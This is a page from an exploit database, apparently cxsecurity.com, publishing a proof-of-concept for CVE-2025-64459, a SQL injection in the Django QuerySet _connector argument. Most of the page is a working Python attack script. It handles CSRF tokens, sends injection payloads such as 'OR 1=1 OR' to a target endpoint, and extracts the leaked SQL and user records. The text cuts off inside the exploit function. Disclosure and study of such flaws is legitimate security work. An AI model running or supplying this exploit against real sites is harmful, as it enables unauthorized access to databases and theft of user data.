---
title: Django 5.1.13 SQL Injection
url: https://cxsecurity.com/issue/WLB-2026020003
source: CXSECURITY Database RSS Feed - CXSecurity.com
date: 2026-02-02
fetch_date: 2026-02-03T04:08:53.030537
---

# Django 5.1.13 SQL Injection

[![Home Page](https://cert.cx/cxstatic/images/12018/cxseci.png)](https://cxsecurity.com/)

* [Home](https://cxsecurity.com/)
* Bugtraq
  + [Full List](https://cxsecurity.com/wlb/)
  + [Only Bugs](https://cxsecurity.com/bugs/)
  + [Only Tricks](https://cxsecurity.com/tricks/)
  + [Only Exploits](https://cxsecurity.com/exploit/)
  + [Only Dorks](https://cxsecurity.com/dorks/)
  + [Only CVE](https://cxsecurity.com/cvelist/)
  + [Only CWE](https://cxsecurity.com/cwelist/)
  + [Fake Notes](https://cxsecurity.com/bogus/)
  + [Ranking](https://cxsecurity.com/best/1/)
* CVEMAP
  + [Full List](https://cxsecurity.com/cvemap/)
  + [Show Vendors](https://cxsecurity.com/cvevendors/)
  + [Show Products](https://cxsecurity.com/cveproducts/)
  + [CWE Dictionary](https://cxsecurity.com/allcwe/)
  + [Check CVE Id](https://cxsecurity.com/cve/)
  + [Check CWE Id](https://cxsecurity.com/cwe/)
* Search
  + [Bugtraq](https://cxsecurity.com/search/)
  + [CVEMAP](https://cxsecurity.com/search/cve/)
  + [By author](https://cxsecurity.com/search/author/)
  + [CVE Id](https://cxsecurity.com/cve/)
  + [CWE Id](https://cxsecurity.com/cwe/)
  + [By vendors](https://cxsecurity.com/cvevendors/)
  + [By products](https://cxsecurity.com/cveproducts/)
* RSS
  + [Bugtraq](https://cxsecurity.com/wlb/rss/all/)
  + [CVEMAP](https://cxsecurity.com/cverss/fullmap/)
  + [CVE Products](https://cxsecurity.com/cveproducts/)
  + [Bugs](https://cxsecurity.com/wlb/rss/vulnerabilities/)
  + [Exploits](https://cxsecurity.com/wlb/rss/exploit/)
  + [Dorks](https://cxsecurity.com/wlb/rss/dorks/)
* More
  + [cIFrex](http://cifrex.org/)
  + [Facebook](https://www.facebook.com/cxsec)
  + [Twitter](https://twitter.com/cxsecurity)
  + [Donate](https://cxsecurity.com/donate/)
  + [About](https://cxsecurity.com/wlb/about/)

* [Submit](https://cxsecurity.com/wlb/add/)

|  |  |  |  |
| --- | --- | --- | --- |
|  |  | |  | | --- | | **Django 5.1.13 SQL Injection** **2026.02.02**  Credit:  **[Wafcontrol Security Team](https://cxsecurity.com/author/Wafcontrol%2BSecurity%2BTeam/1/)**  Risk: **Medium**  Local: **No**  Remote: ****Yes****  CVE: **[CVE-2025-64459](https://cxsecurity.com/cveshow/CVE-2025-64459/ "Click to see CVE-2025-64459")**  CWE: **[CWE-89](https://cxsecurity.com/cwe/CWE-89 "Click to see CWE-89")** | |

# Exploit Title: Django 5.1.13 - SQL Injection
# Google Dork: [none] # Not applicable for this vulnerability
# Date: 2025-12-03
# Exploit Author: Wafcontrol Security Team
# Vendor Homepage: https://www.djangoproject.com/
# Software Link: https://www.djangoproject.com/download/
# Version: 5.2 before 5.2.8, 5.1 before 5.1.14, 4.2 before 4.2.26 (possibly earlier versions like 5.0.x, 4.1.x, 3.2.x)
# Tested on: Ubuntu 24.04 with Django 5.1.13 (vulnerable version)
# CVE: 2025-64459
Description:
This proof-of-concept exploits a SQL injection vulnerability in Django's QuerySet methods (filter, exclude, get) and Q objects
when using a crafted dictionary with expansion as the \_connector argument. The vulnerability allows an attacker to inject
arbitrary SQL into the WHERE clause, potentially leading to data leakage, modification, or other database compromises.
The script targets a vulnerable Django application endpoint that accepts user input for the \_connector parameter.
It supports multiple modes:
- baseline: Send a safe request and display results.
- exploit: Send an exploit payload and compare with baseline.
- multi: Test multiple payloads sequentially.
- check: Automatically check if the target appears vulnerable.
Usage:
python3 exploit.py <mode> -u <target\_url> [options]
Modes:
- baseline: Run a safe baseline test.
- exploit: Run an exploit test with a single payload.
- multi: Test multiple payloads (use -p multiple times or comma-separated).
- check: Quick vulnerability check using default payloads.
Examples:
python3 exploit.py baseline -u http://target/
python3 exploit.py exploit -u http://target/ -p "OR 1=1 OR"
python3 exploit.py multi -u http://target/ -p "OR 1=1 OR" -p "AND 1=0 AND"
python3 exploit.py check -u http://target/
Options:
- -b, --baseline: Baseline connector value (default: 'AND')
- -v, --verbose: Enable verbose output
- -o, --output: Save output to a file
Requirements:
- Python 3.x
- requests library (pip install requests)
Note:
- This is for educational and testing purposes only. Use on authorized systems.
- Ensure the target endpoint exposes the executed SQL (e.g., via debug mode or custom template) for demonstration.
- In a real scenario, adapt the parsing logic to the application's response structure.
- For advanced usage, customize payloads for specific SQL dialects (e.g., SQLite, PostgreSQL).
import re
import sys
import argparse
import json
from typing import List, Tuple, Optional
import requests
DEFAULT\_BASELINE = "AND"
DEFAULT\_PAYLOADS = ["OR 1=1 OR", "AND 1=0 AND", "OR 'a'='a' OR"]
def extract\_sql\_and\_users(html: str) -> Tuple[Optional[str], List[str]]:
"""
Extracts the executed SQL and list of users from the HTML response.
Assumes the template structure:
- SQL inside <pre>...</pre>
- Users inside <li>username – email</li>
Adjust regex patterns based on the actual response format.
"""
# Extract SQL from the first <pre>...</pre>
sql\_match = re.search(r"<pre>(.\*?)</pre>", html, re.DOTALL)
executed\_sql = sql\_match.group(1).strip() if sql\_match else None
# Extract users from <li>...</li>
users = re.findall(r"<li>(.\*?)</li>", html)
users = [u.strip() for u in users if u.strip()]
return executed\_sql, users
def send\_payload(target\_url: str, connector\_value: str, verbose: bool = False) -> Tuple[Optional[str], List[str]]:
"""
Sends a POST request with the connector value as the search field.
Handles CSRF token extraction and session management.
Returns the executed SQL and list of users from the response.
"""
if verbose:
print(f"[\*] Fetching CSRF token from {target\_url}...")
# Step 1: GET request to fetch CSRF token
try:
get\_resp = requests.get(target\_url, timeout=10)
get\_resp.raise\_for\_status()
except requests.RequestException as e:
print(f"[!] GET request failed: {e}")
sys.exit(1)
# Extract csrfmiddlewaretoken from the form
csrf\_match = re.search(r'name="csrfmiddlewaretoken" value="([^"]+)"', get\_resp.text)
if not csrf\_match:
print("[!] Could not find CSRF token in the response.")
sys.exit(1)
csrf\_token = csrf\_match.group(1)
if verbose:
print(f"[i] CSRF token: {csrf\_token[:10]}...")
# Prepare POST data
data = {
"csrfmiddlewaretoken": csrf\_token,
"search": connector\_value,
}
# Use session to maintain cookies (including CSRF)
session = requests.Session()
session.cookies.update(get\_resp.cookies)
if verbose:
print(f"[\*] Sending POST with connector = {repr(connector\_value)}...")
# Step 2: POST request with payload
try:
post\_resp = session.post(target\_url, data=data, timeout=10)
post\_resp.raise\_for\_status()
except requests.RequestException as e:
print(f"[!] POST request failed: {e}")
sys.exit(1)
# Parse response
executed\_sql, users = extract\_sql\_and\_users(post\_resp.text)
return executed\_sql, users
def run\_baseline(target\_url: str, baseline: str, verbose: bool, output\_file: Optional[str]) -> Tuple[Optional[str], List[str]]:
print("[\*] Running baseline test...")
base\_sql, base\_users = send\_payload(target\_url, baseline, verbose)
print("\n--- Baseline (Safe) ---")
print("Executed SQL:")
print(base\_sql or "(No SQL found)")
print("\nUsers Returned:")
if base\_users:
for u in base\_users:
print(" -", u)
else:
print(" (No users)")
if output\_file:
with open(output\_file, 'a') as f:
f.write("--- Baseline ---\n")
f.write(f"SQL: {base\_sql or 'None'}\n")
f.write("Users: " + json.dumps(base\_users) + "\n\n")
return base\_sql, base\_users
def run\_exploit(target\_url: str, payload: str, baseline\_data: Tuple[Optional[str], List[str]], verbose: bool, output\_file: Optional[str]):
print(f"\n[\*] Running exploit with payload = {repr(payload)}...")
exploit\_sql, exploit\_users = send\_payload(target\_url, payload, verbose)
print("\n--- Exploit Attempt ...